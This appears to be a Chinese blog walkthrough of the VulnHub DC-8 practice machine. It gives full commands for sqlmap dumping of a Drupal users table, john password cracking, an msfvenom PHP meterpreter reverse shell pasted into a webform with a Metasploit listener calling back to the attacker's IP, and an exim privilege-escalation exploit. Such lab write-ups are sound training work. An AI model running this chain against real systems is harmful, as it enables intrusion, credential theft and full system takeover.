vulnhub之dc8的实践

本周实践的是vulnhub的dc8镜像，下载地址，https://download.vulnhub.com/dc/DC-8.zip，

启动靶机，先来个地址扫描，sudo netdiscover -r 192.168.137.0/24，

接着来个端口扫描，sudo nmap -sS -sV -T4 -A -p- 192.168.137.2，

浏览器访问http服务看看情况，发现了疑似可SQL注入的点，

直接上sqlmap，先脱db，

sudo sqlmap -u "http://192.168.137.2/?nid=1" --dbs，

有用的db应该是d7db，再脱table，

sudo sqlmap -u "http://192.168.137.2/?nid=1" -D d7db --tables，

有用的table应该是users，再脱字段，

sudo sqlmap -u "http://192.168.137.2/?nid=1" -D d7db -T users --columns，

有用的字段应该是name和pass，再脱字段内容，

sudo sqlmap -u "http://192.168.137.2/?nid=1" -D d7db -T users -C name,pass --dump，

pass明显是加了密，上john破解，得到john/turtle，

sudo john --wordlist=/usr/share/wordlists/rockyou.txt dc8-pass.txt，

ssh无法登录靶机，需要再试能否登录web后台，接下来就得找后台入口，

先试了dirb无果，既然知道是drupal服务，那就上专门针对性的扫描神器，

在攻击机kali里安装droopescan，

sudo apt-get install python-pip，sudo pip install droopescan，

扫描靶机，sudo droopescan scan drupal -u http://192.168.137.2，

得到了后台入口，http://192.168.137.2/user/login，


用john/turtle登录成功，

接下来是搞反弹webshell，发现contact us的webform能够提交代码，

跟上期一样，先做个php的webshell代码出来，

sudo msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.137.197 LPORT=4444 R，

攻击机kali上再开个meterpreter shell监听，

use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set lhost 192.168.137.197
set lport 4444
run

把webshell代码粘到contact us的webform内容框中，

提交后meterpreter shell就过来了，不是root，需要进一步提权，

进入/tmp目录，下载linux下的提权脚本，

https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py，

执行脚本后，一个个研究脚本给出的提权建议，都无果，

参考别人的writeup，说是exim4这个软件可利用，

看了一下exim的软件版本，dpkg -l | grep exim，

在网上搜了一下exim的本地提权方法，

这个链接给的方法就可用，https://www.exploit-db.com/exploits/46996，

根据链接里提示的方法，把提权脚本下载到靶机，并执行，

至此拿root权限成功。
